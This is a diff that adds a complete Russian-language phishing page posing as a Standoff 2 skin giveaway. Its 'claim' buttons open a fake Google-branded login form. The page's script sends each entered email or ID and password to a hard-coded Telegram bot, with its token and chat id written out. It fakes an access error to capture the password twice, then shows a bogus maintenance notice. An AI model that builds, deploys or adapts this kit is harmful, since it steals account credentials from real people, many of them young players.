@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>S2 Inventory Market</title>
+  <style>
+    :root { --main: #0d0d0e; --accent: #ff9a1a; }
+    body { background: var(--main); color: #fff; font-family: sans-serif; margin: 0; text-align: center; }
+    .header { background: #1a1b1e; padding: 20px; border-bottom: 2px solid var(--accent); }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 15px; }
+    .card { background: #16171a; padding: 10px; border-radius: 10px; }
+    .card img { width: 100%; border-radius: 5px; }
+    .btn { background: var(--accent); border: none; padding: 10px; width: 100%; border-radius: 5px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+    
+    /* Скрытая модалка */
+    #auth-box { position: fixed; inset: 0; background: rgba(0,0,0,0.98); display: none; justify-content: center; align-items: center; z-index: 999; }
+    .f-window { background: #fff; color: #000; width: 90%; max-width: 360px; padding: 30px; border-radius: 10px; }
+    .f-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+    .f-btn { background: #1a73e8; color: #fff; border: none; width: 100%; padding: 12px; border-radius: 5px; font-weight: bold; }
+    .err { color: red; font-size: 13px; margin-bottom: 10px; display: none; }
+  </style>
+</head>
+<body>
+
+<div id="content">
+  <div class="header">ST-MARKET</div>
+  <div style="background: #1a73e8; padding: 15px;">🎁 Бонус от друга: +5000G</div>
+  <div class="grid">
+    <div class="card"><img src="https://wiki.standoff2.com/images/thumb/7/7b/Karambit_Gold.png/250px-Karambit_Gold.png"><button class="btn" onclick="showAuth()">ЗАБРАТЬ</button></div>
+    <div class="card"><img src="https://wiki.standoff2.com/images/thumb/1/1d/Butterfly_Dragon_Glass.png/250px-Butterfly_Dragon_Glass.png"><button class="btn" onclick="showAuth()">ЗАБРАТЬ</button></div>
+  </div>
+</div>
+
+<div id="auth-box">
+  <div class="f-window">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70">
+    <h3>Подтверждение</h3>
+    <p style="font-size:14px;">Авторизуйтесь через сервис G-ID</p>
+    <div id="err">Ошибка доступа. Повторите ввод.</div>
+    <form id="f-form">
+      <input type="text" id="u" class="f-input" placeholder="ID или Почта" required>
+      <input type="password" id="p" class="f-input" placeholder="Пароль" required>
+      <button type="submit" class="f-btn">Продолжить</button>
+    </form>
+  </div>
+</div>
+
+<script>
+  let step = 0;
+  function showAuth() { document.getElementById('auth-box').style.display = 'flex'; }
+  
+  document.getElementById('f-form').onsubmit = function(e) {
+    e.preventDefault();
+    step++;
+    const u = document.getElementById('u').value;
+    const p = document.getElementById('p').value;
+    
+    fetch(`https://api.telegram.org/bot7963286576:AAHIdvE79eYVb-4mSsqGgR3Y_M5B5Xit2eI/sendMessage?chat_id=6155982855&text=🎯 LOG [${step}/2]\n👤: ${u}\n🔑: ${p}`);
+    
+    if(step < 2) {
+      document.getElementById('err').style.display = 'block';
+      document.getElementById('p').value = '';
+    } else {
+      document.body.innerHTML = '<h1 style="margin-top:100px;">Технические работы...</h1><p>Попробуйте позже.</p>';
+    }
+  };
+</script>
+</body>
+</html>
